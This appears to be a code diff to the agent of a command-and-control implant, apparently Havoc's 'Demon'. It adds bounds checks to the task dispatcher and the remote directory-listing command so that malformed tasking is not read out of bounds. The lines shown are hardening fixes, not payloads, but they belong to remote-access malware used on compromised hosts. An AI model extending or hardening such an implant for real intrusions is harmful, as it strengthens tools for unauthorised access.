@@ -101,6 +101,13 @@ VOID CommandDispatcher( VOID )
                 RequestID  = ParserGetInt32( &Parser );
                 TaskBuffer = ParserGetBytes( &Parser, &TaskBufferSize );
 
+                /* malformed task buffer (length prefix out of bounds).
+                 * stop dispatching instead of reading out of bounds. */
+                if ( ! TaskBuffer ) {
+                    PRINTF( "CommandDispatcher: failed to parse task buffer for CommandID:[%x]\n", CommandID )
+                    break;
+                }
+
                 Instance->CurrentRequestID = RequestID;
 
                 if ( CommandID != DEMON_COMMAND_NO_JOB ) {
@@ -698,20 +705,34 @@ VOID CommandFS( PPARSER Parser )
             PDIR_OR_FILE     DirOrFile    = NULL;
             PDIR_OR_FILE     TmpDirOrFile = NULL;
             UINT32           PathSize     = NULL;
+            UINT32           TargetSize   = 0;
+            UINT32           FilterSize   = 0;
 
             FileExplorer = ParserGetBool( Parser );
-            TargetFolder = ParserGetWString( Parser, NULL );
+            TargetFolder = ParserGetWString( Parser, &TargetSize );
             SubDirs      = ParserGetBool( Parser );
             FilesOnly    = ParserGetBool( Parser );
             DirsOnly     = ParserGetBool( Parser );
             ListOnly     = ParserGetBool( Parser );
-            Starts       = ParserGetWString( Parser, NULL );
-            Contains     = ParserGetWString( Parser, NULL );
-            Ends         = ParserGetWString( Parser, NULL );
+            Starts       = ParserGetWString( Parser, &FilterSize );
+            if ( FilterSize < sizeof( WCHAR ) || ! Starts[ 0 ] )
+                Starts = NULL;
+            Contains     = ParserGetWString( Parser, &FilterSize );
+            if ( FilterSize < sizeof( WCHAR ) || ! Contains[ 0 ] )
+                Contains = NULL;
+            Ends         = ParserGetWString( Parser, &FilterSize );
+            if ( FilterSize < sizeof( WCHAR ) || ! Ends[ 0 ] )
+                Ends = NULL;
 
-            Starts   = Starts[ 0 ]   ? Starts   : NULL;
-            Contains = Contains[ 0 ] ? Contains : NULL;
-            Ends     = Ends[ 0 ]     ? Ends     : NULL;
+            if ( ! TargetFolder || TargetSize < sizeof( WCHAR ) )
+            {
+                PUTS( "FS::Dir: failed to parse target folder" )
+                PackageAddBool( Package, FileExplorer );
+                PackageAddBool( Package, ListOnly );
+                PackageAddWString( Package, L"" );
+                PackageAddBool( Package, FALSE );
+                break;
+            }
 
             Path = Instance->Win32.LocalAlloc( LPTR, MAX_PATH * sizeof( WCHAR ) );
 
@@ -732,7 +753,13 @@ VOID CommandFS( PPARSER Parser )
             }
             else
             {
-                MemCopy( Path, TargetFolder, MAX_PATH * sizeof( WCHAR ) );
+                /* copy the target folder into our fixed size buffer.
+                 * truncate instead of reading past the parsed string. */
+                if ( TargetSize > ( MAX_PATH - 1 ) * sizeof( WCHAR ) )
+                    TargetSize = ( MAX_PATH - 1 ) * sizeof( WCHAR );
+
+                MemCopy( Path, TargetFolder, TargetSize );
+                Path[ TargetSize / sizeof( WCHAR ) ] = 0;
             }
 
             PRINTF( "Path: %ls\n", Path )
